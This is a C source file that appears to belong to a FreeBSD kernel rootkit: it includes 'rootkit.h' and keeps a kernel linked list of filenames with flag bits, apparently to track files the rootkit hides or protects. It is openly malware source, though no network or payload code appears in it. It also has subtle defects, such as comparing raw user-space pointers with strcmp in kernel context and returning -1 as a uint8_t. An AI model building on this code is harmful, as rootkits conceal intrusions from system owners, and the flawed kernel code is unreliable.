#include "rootkit.h"

static struct node * first_node = NULL;

int add_file(char * uaddr){

	struct node ** n;

	for(n = &first_node; *n != NULL; n = &(*n)->next) {
		if(strcmp(uaddr, (*n)->filename) == 0) return 1;
	}

	struct node * new_node = malloc(sizeof(struct node), M_TEMP, M_ZERO);
	new_node->next = NULL;
	new_node->flags = 0b11111111;

	size_t done;
	copyinstr(uaddr, new_node->filename, 256, &done);
	*n = new_node;

	uprintf("%s\n", new_node->filename);

	return 0;
}

int remove_file(char * uaddr){
	struct node ** n;

	for(n = &first_node; *n != NULL; n = &(*n)->next) {
		if(strcmp(uaddr, (*n)->filename) == 0) {
			struct node * temp = *n;
			*n = (*n)->next;
			free(temp, M_TEMP);
			break;
		}
	}
	return 0;
}

int check_file(char * uaddr) {
	struct node ** n;

	for(n = &first_node; *n != NULL; n = &(*n)->next) {
		if(strcmp(uaddr, (*n)->filename) == 0) {
			return 1;
		}
	}
	return 0;
}

int set_flag_bits(char * uaddr, uint8_t flags) {
	struct node ** n;

	for(n = &first_node; *n != NULL; n = &(*n)->next) {
		if(strcmp(uaddr, (*n)->filename) == 0) {
			(*n)->flags |= flags;
			break;
		}
	}
	return 0;
}

int unset_flag_bits(char * uaddr, uint8_t flags) {
	struct node ** n;

	for(n = &first_node; *n != NULL; n = &(*n)->next) {
		if(strcmp(uaddr, (*n)->filename) == 0) {
			(*n)->flags &= ~flags;
			break;
		}
	}
	return 0;
}

uint8_t get_flags(char * uaddr) {
	struct node ** n;

	for(n = &first_node; *n != NULL; n = &(*n)->next) {
		if(strcmp(uaddr, (*n)->filename) == 0) {
			return (*n)->flags;
		}
	}
	return -1;
}

